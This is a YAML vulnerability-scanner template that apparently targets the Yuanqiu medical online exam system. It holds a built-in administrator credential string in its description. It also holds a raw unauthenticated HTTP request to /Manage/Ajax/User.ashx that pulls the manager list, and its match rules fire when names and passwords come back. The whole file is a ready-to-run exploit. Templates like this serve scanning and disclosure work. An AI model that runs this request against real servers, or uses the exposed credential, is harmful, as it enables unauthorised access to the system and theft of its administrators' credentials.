id: yuanqiu-medical-exam-arbitrary-user-login

info:
  name: 远秋医学在线考试系统内置管理员账户权限控制缺陷
  author: 0dayPoc
  severity: high
  description: |-
    该系统在版本 V3.26.9 及以下存在认证机制缺陷，允许攻击者通过预置的系统管理员账户(YuanqiuExam 1398311407513708315661)实现未授权访问
      默认凭证采用DES算法加密存储，密文形式暴露潜在权限提升风险
  tags: 远秋医学在线考试系统

http:
- raw:
  - |
    POST /Manage/Ajax/User.ashx/ HTTP/1.1
    Host: {{Hostname}}
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    oper=getManagerList&name=&code=&depart=&page=1&rows=15
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'Name'
  - type: word
    part: body
    words:
    - 'Password'
